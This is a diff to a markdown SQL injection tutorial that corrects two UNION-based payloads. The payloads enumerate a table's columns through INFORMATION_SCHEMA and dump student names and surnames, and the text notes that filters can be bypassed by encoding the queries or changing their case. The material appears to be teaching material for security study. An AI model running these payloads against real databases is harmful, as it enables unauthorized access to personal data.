@@ -347,13 +347,13 @@ We obtain all the databases names. Imagine we found the database ```SCHOOL``` fr
 If we want to have a look at the ```Student``` table, we can list the names of the columns like that :
 
 ```sql
-' UNION group_concat(0x7c,COLUMN_NAME,0x7c),group_concat(0x7c,TABLE_NAME,0x7c) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Student' -- -
+' UNION SELECT group_concat(0x7c,COLUMN_NAME,0x7c),group_concat(0x7c,TABLE_NAME,0x7c) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Student' -- -
 ```
 
 We get the name and the surname with :
 
 ```sql
-' UNION SELECTgroup_concat(0x7c,name,0x7c),group_concat(0x7c,surname,0x7c) FROM Student -- -
+' UNION SELECT group_concat(0x7c,name,0x7c),group_concat(0x7c,surname,0x7c) FROM Student -- -
 ```
 
 If there are some protections, you can try to bypass them by encoding your queries, changing the case... This [PortSwigger article](https://portswigger.net/support/sql-injection-bypassing-common-filters) can explain it to you.
